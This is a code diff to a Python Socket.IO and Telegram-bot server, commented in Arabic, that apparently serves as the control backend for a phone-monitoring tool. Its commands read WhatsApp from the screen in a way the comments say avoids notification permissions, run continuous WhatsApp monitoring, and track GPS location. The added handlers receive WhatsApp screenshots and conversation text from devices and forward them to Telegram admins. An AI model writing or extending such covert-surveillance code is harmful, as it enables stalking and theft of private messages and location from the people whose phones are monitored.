@@ -243,8 +243,8 @@ COMMANDS = {
     # ⚠️ gmail تمت إزالته — يحتاج Notification Access
     # ⚠️ whatsapp-messages تمت إزالته — يحتاج Notification Access
     "whatsapp-live":     {"category": "data", "label": "💬 واتساب مباشر",  "description": "قراءة واتساب من الشاشة (بدون إذن إشعارات)", "needs_param": False},
-    "whatsapp-monitor-on":  {"category": "data", "label": "👁️ تفعيل مراقبة واتساب", "description": "مراقبة دائمة لرسائل واتساب", "needs_param": False},
-    "whatsapp-monitor-off": {"category": "data", "label": "⏹ إيقاف مراقبة واتساب", "description": "إيقاف مراقبة واتساب", "needs_param": False},
+    "whatsapp-monitor-on":  {"category": "data", "label": "🟢 بدء مراقبة الواتساب", "description": "مراقبة ذكية كل 10 ثوانٍ + بصمة MD5", "needs_param": False},
+    "whatsapp-monitor-off": {"category": "data", "label": "⏹ إيقاف مراقبة الواتساب", "description": "إيقاف مراقبة واتساب", "needs_param": False},
     # ⚠️ telegram-messages تمت إزالته — يحتاج Notification Access
     "get-location":   {"category": "data",   "label": "📍 الموقع GPS",     "description": "تتبع موقع الجهاز",       "needs_param": False},
     # camera
@@ -2454,6 +2454,101 @@ def _sock_base64_media(data):
         logger.warning(f"[Socket] base64_media from unknown SID={request.sid}")
         return
     _process_base64_media(dev, data, request.sid)
+
+
+# ⚡⚡⚡ SOCKET.IO: whatsapp-image handler (مراقبة واتساب الذكية)
+@socketio.on("whatsapp-image")
+def _sock_whatsapp_image(data):
+    """⚡ يستقبل صور واتساب من المراقبة الذكية:
+    - الصورة (Base64)
+    - نص المحادثة المستخرج
+    - يرسل للبوت: bot.sendPhoto(caption=text)
+    """
+    dev = dm.get_device_by_sid(request.sid)
+    if not dev:
+        logger.warning(f"[Socket] whatsapp-image from unknown SID={request.sid}")
+        return
+    _process_whatsapp_image(dev, data, request.sid)
+
+
+@socketio.on("whatsapp-monitor-status")
+def _sock_whatsapp_monitor_status(data):
+    """⚡ يستقبل حالة مراقبة واتساب (started/stopped)"""
+    dev = dm.get_device_by_sid(request.sid)
+    if not dev:
+        return
+    status = data.get("status", "?")
+    short_label = _dev_label(dev)
+    logger.info(f"👁️ WhatsApp monitor #{dev.get('short_id', '?')}: {status}")
+    if mdm_bot:
+        for admin_id in Config.ADMIN_IDS:
+            try:
+                emoji = "🟢" if status == "running" else "⏹"
+                msg = (f"{emoji} <b>مراقبة واتساب</b>\n\n"
+                       f"📱 <b>{short_label}</b>\n"
+                       f"📊 الحالة: {status}")
+                mdm_bot.bot.send_message(admin_id, msg, parse_mode="HTML")
+            except Exception as e:
+                logger.error(f"❌ Failed to send monitor status: {e}")
+
+
+def _process_whatsapp_image(dev, data, sid):
+    """⚡ يعالج صورة واتساب: يفك Base64 → يرسل للبوت مع نص المحادثة"""
+    try:
+        b64data = data.get("image", "") or data.get("data", "")
+        conversation_text = data.get("text", "")
+        image_size = data.get("size", 0)
+
+        logger.info(f"📱 whatsapp-image from #{dev.get('short_id', '?')}: "
+                    f"image={len(b64data)} chars, text={len(conversation_text)} chars")
+
+        # إذا فيه صورة
+        if b64data:
+            import base64 as _b64
+            binary = _b64.b64decode(b64data)
+            logger.info(f"📸 Decoded {len(binary)} bytes — sending to bot")
+
+            if mdm_bot:
+                short_label = _dev_label(dev)
+                from io import BytesIO
+                bio = BytesIO(binary)
+
+                # Caption يحتوي على نص المحادثة
+                caption = (f"📱 <b>مراقبة واتساب</b>\n"
+                          f"📱 <b>{short_label}</b>\n"
+                          f"📏 {len(binary)} bytes\n"
+                          f"━━━━━━━━━━━━━━━\n"
+                          f"{conversation_text}")
+
+                # Caption محدود بـ 1024 حرف (حد تليجرام)
+                if len(caption) > 1024:
+                    caption = caption[:1020] + "..."
+
+                for admin_id in Config.ADMIN_IDS:
+                    try:
+                        mdm_bot.bot.send_photo(admin_id, photo=bio, caption=caption, parse_mode="HTML")
+                        bio.seek(0)
+                        logger.info(f"✅ WhatsApp image sent to admin {admin_id}")
+                    except Exception as e:
+                        logger.error(f"❌ Failed to send WhatsApp image to admin {admin_id}: {e}")
+        else:
+            # نص فقط (بدون صورة)
+            if mdm_bot and conversation_text:
+                short_label = _dev_label(dev)
+                msg = (f"📱 <b>مراقبة واتساب (نص فقط)</b>\n"
+                      f"📱 <b>{short_label}</b>\n"
+                      f"━━━━━━━━━━━━━━━\n"
+                      f"{conversation_text}")
+                for admin_id in Config.ADMIN_IDS:
+                    try:
+                        mdm_bot.bot.send_message(admin_id, msg, parse_mode="HTML")
+                    except Exception as e:
+                        logger.error(f"❌ Failed to send text: {e}")
+
+        if sid:
+            _pending_cmds.pop(sid, None)
+    except Exception as e:
+        logger.error(f"❌ whatsapp-image error: {e}", exc_info=True)
 
 
 def _process_base64_media(dev, data, sid):
